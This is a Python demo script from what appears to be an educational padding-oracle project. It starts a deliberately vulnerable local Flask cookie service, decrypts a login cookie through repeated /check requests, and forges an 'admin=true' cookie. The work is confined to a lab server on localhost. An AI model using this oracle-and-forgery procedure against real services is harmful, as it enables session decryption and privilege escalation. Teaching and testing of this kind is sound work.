"""
demo_http.py
------------
End-to-end demo of the padding-oracle attack over REAL HTTP, not just
in-process function calls: this starts the Flask app from
padding_oracle/server.py in a background thread, logs in to get a
cookie, and then decrypts it using only POST requests to /check.

Run:  python3 demo_http.py
"""
import logging
import threading
import time
import requests

logging.getLogger("werkzeug").setLevel(logging.WARNING)

from padding_oracle.server import CookieService, build_flask_app
from padding_oracle import attack as A
from padding_oracle.aes_core import pkcs7_unpad

HOST, PORT = "127.0.0.1", 5055
BASE = f"http://{HOST}:{PORT}"


def start_server(service):
    app = build_flask_app(service)
    thread = threading.Thread(
        target=lambda: app.run(host=HOST, port=PORT, debug=False, use_reloader=False),
        daemon=True,
    )
    thread.start()
    time.sleep(0.5)  # give Flask a moment to bind
    return thread


def main():
    service = CookieService(vulnerable=True)
    start_server(service)
    print(f"[*] vulnerable cookie service listening on {BASE}")

    resp = requests.post(f"{BASE}/login", json={"username": "alice"})
    data = resp.json()
    iv, ct = bytes.fromhex(data["iv"]), bytes.fromhex(data["ciphertext"])
    print(f"[*] got cookie: iv={iv.hex()} ciphertext={ct.hex()}")
    print("[*] (the attacker does NOT know the plaintext or the key)")

    def http_oracle(prev_block: bytes, target_block: bytes) -> bool:
        payload = {"iv": prev_block.hex(), "ciphertext": target_block.hex()}
        r = requests.post(f"{BASE}/check", json=payload)
        return r.json()["status"] == "ok"

    stats = A.AttackStats()
    t0 = time.time()
    recovered_padded = A.decrypt(http_oracle, iv, ct, stats)
    t1 = time.time()
    recovered = pkcs7_unpad(recovered_padded)

    print(f"[*] recovered plaintext over HTTP: {recovered!r}")
    print(f"[*] oracle queries: {stats.queries}   time: {t1 - t0:.1f}s")

    print("[*] now forging a ciphertext for 'user=mallory;admin=true' ...")
    stats2 = A.AttackStats()
    forged_iv, forged_ct = A.forge_ciphertext(http_oracle, b"user=mallory;admin=true", stats2)
    r = requests.post(f"{BASE}/check", json={"iv": forged_iv.hex(), "ciphertext": forged_ct.hex()})
    print(f"[*] server's verdict on the forged cookie: {r.json()}   (queries used: {stats2.queries})")


if __name__ == "__main__":
    main()
